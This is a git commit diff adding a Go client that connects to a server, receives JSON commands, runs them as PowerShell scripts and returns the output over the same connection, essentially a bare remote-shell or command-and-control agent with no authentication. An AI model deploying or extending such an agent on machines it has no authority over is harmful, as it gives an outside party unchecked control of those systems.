b9eff22475b7121c5def596b8151d3937114f3e6
style77 <stylek777@gmail.com>
2023-11-09 12:22:29 +0100

    feat: receive and execute commands on client side

--- client/commands.go
+++ client/commands.go
@@ -1,5 +1,88 @@
 package main
 
-func HandleCommand() {
+import (
+	"context"
+	"io/ioutil"
+	"log"
+	"net"
+	"os"
+	"os/exec"
+	"os/signal"
+	"strings"
+	"sync"
+	"syscall"
+)
 
+type Command struct {
+	Name string
+	Args []string
+}
+
+func HandleCommand(command Command, conn net.Conn) {
+	log.Printf("Received command %s\n", command.Name)
+
+	switch command.Name {
+	case "ps":
+		go execPs(strings.Join(command.Args[0:], " "), conn)
+	}
+}
+
+func handleCommandContext(name, args string, conn net.Conn) {
+	cmdCtx, cmdCancel := context.WithCancel(context.Background())
+
+	cmd := exec.CommandContext(cmdCtx, name, args)
+	cmd.SysProcAttr = &syscall.SysProcAttr{}
+
+	outputPipe, err := cmd.StdoutPipe()
+	if err != nil {
+		log.Println(err)
+	}
+
+	err = cmd.Start()
+	if err != nil {
+		log.Println(err)
+	}
+
+	var wg sync.WaitGroup
+	go func() {
+		wg.Add(1)
+		defer wg.Done()
+
+		output, err := ioutil.ReadAll(outputPipe)
+		if err != nil {
+			log.Println(err)
+		}
+
+		if len(output) > 0 {
+			processCommandOutput(string(output), conn)
+		}
+
+		waitError := cmd.Wait()
+		if waitError != nil {
+			log.Println(waitError)
+		}
+	}()
+
+	interruptChannel := make(chan os.Signal, 1)
+	signal.Notify(interruptChannel, os.Interrupt, syscall.SIGTERM)
+
+	go func() {
+		<-interruptChannel
+		log.Println("Received an interrupt signal. Stopping the command...")
+		cmdCancel()
+	}()
+
+	wg.Wait()
+}
+
+func processCommandOutput(output string, conn net.Conn) {
+	log.Printf("PowerShell command output: %s\n", output)
+
+	sendOutputToServer(output, conn)
+}
+
+func execPs(script string, conn net.Conn) {
+	log.Printf("Executing script %s\n", script)
+
+	go handleCommandContext("powershell", script, conn)
 }
--- client/main.go
+++ client/main.go
@@ -1,9 +1,13 @@
 package main
 
 import (
+	"bytes"
+	"encoding/gob"
+	"encoding/json"
 	"fmt"
 	"log"
 	"net"
+	"os"
 )
 
 const host = "localhost"
@@ -15,13 +19,56 @@ func main() {
 		log.Fatal("Couldn't connect to server")
 	}
 
+	defer conn.Close()
 	log.Printf("Connected to server")
 
-	defer conn.Close()
-
-	// buffer := make([]byte, 1024)
-
 	for {
+		reply := make([]byte, 2048)
 
+		_, err = conn.Read(reply)
+		if err != nil {
+			log.Println("Write to server failed:", err.Error())
+			os.Exit(1)
+		}
+
+		reply = bytes.Trim(reply, "\x00")
+		log.Println("Server send data:", string(reply))
+
+		// if server send A, this means we are only checking connection
+		if string(reply) == "A" {
+			continue
+		}
+
+		data := Command{}
+		err := json.Unmarshal(reply, &data)
+		if err != nil {
+			log.Printf("Couldn't unpack data. %s", err)
+			continue
+		}
+
+		HandleCommand(Command{
+			Name: data.Name,
+			Args: data.Args,
+		}, conn)
 	}
+}
+
+type Output struct {
+	Output     string
+	RemoteAddr string
+}
+
+func sendOutputToServer(output string, conn net.Conn) {
+	var buffer bytes.Buffer
+
+	enc := gob.NewEncoder(&buffer)
+
+	err := enc.Encode(Output{
+		Output:     output,
+		RemoteAddr: conn.RemoteAddr().String(),
+	})
+	if err != nil {
+		log.Println("Couldn't encode output")
+	}
+	conn.Write(buffer.Bytes())
 }
